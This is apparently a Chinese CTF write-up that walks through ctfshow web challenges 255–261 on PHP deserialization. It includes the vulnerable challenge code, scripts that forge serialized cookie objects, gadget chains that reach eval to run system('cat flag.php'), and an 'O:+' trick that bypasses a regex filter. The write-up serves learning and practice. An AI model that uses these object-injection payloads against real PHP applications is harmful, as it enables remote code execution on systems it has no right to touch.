<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">        public function Write()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        protected static function Read()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        function Listen()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://c.biancheng.net/view/7492.html">http://c.biancheng.net/view/7492.html</a></p>
<h2 id="web255-–认识反序列化"><a href="#web255-–认识反序列化" class="headerlink" title="web255 –认识反序列化"></a>web255 –认识反序列化</h2><p>PHP serialize() 函数</p>
<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>如果想要将已序列化的字符串变回 PHP 的值，可使用 <a href="https://www.runoob.com/php/php-unserialize-function.html">unserialize()</a>。</p>
<p><strong>虽然我们不能改变类方法，但我们可以改变类的属性</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始有反序列化，主要就是$isVip的值需要为true</p>
<p>所以我们可以序列化一个ctfShowUser的实例，将其中的$isVip更改为true</p>
<p>通过cookie传递序列化字符串就可以了,<strong>记得序列化字符串要进行url编码</strong></p>
<p>生成序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment">// 传入的对象isvip=true;</span></span><br><span class="line">	<span class="comment">// O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>多了一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>重新定义一下username password</p>
<p>payload: username&#x3D;ctf&amp;password&#x3D;xxx</p>
<p><code>url=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A3%3A%22ctf%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22xxx%22%3B%7D</code></p>
<p>ctfshow{02a42717-ddee-45d2-964d-fde32fa618bf}</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//魔术方法 通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。在类实例化的时候,会自动调用该魔术方法,进行类的初始化;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815338">https://blog.csdn.net/Jeff_12138/article/details/124815338</a></p>
<p><a href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//__construct：实例化对象时被调用，其作用是拿来初始化一些值。</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正则过滤[<a href="https://so.csdn.net/so/search?q=oc&spm=1001.2101.3001.7020">oc</a>]是匹配o字符或者c字符，\d匹配一个数字字符，等价于[0-9]，+号是匹配前面的\d一次或者多次。下面只需要将O:11变成O:+11就可以绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class"> &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;tac f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web259原生类利用"><a href="#web259原生类利用" class="headerlink" title="web259原生类利用"></a>web259原生类利用</h2><p>不会&#96;</p>
<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化后含有ctfshow_i_love_36D</p>
<p>直接get传参ctfshow_i_love_36D即可</p>
<p>ctfshow{95f2cc54-4c24-4de1-a5ef-8bc52a47a174}</p>
<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password; </span><br><span class="line">    &#125; <span class="comment">//code 赋值code=username</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;  <span class="comment">//弱类型比较code=877+字符</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

